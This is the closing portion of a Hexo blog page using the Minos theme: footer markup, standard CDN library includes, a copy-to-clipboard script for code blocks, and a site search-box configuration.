                        href="https://github.com/ppoffice/hexo-theme-minos">Minos</a>
                        
            </div>
            <div class="column is-hidden-mobile"></div>
            <div class="column is-narrow has-text-centered">
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
                </script>
            </div>
            
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    // moment.locale("en-AU");
    moment.locale("en");
</script>


    
    
    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>